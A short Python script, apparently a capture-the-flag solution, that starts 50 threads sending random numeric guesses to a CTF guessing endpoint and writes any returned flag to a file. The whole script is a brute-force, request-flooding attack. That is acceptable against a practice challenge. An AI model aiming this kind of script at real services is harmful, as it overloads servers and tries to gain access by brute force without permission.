import requests
import threading
import random

url = 'https://guessing.tasks.mctf.online/guess'
username = 'LeKSuS'

def make_guess():
    while True:
        data = {
            'number': str(random.randrange(-1_000_000_000_000_000_000,
                                            1_000_000_000_000_000_000)),
            'username': 'LeKSuS'
        }

        r = requests.post(url, json=data).json()
        flag = r['flag']
        if flag is not None:
            with open(str(random.randint(1000, 3000)) + '_flag.txt', 'w') as f:
                f.write(flag)

threads = []
for i in range(50):
    t = threading.Thread(target=make_guess)
    t.daemon = True
    threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()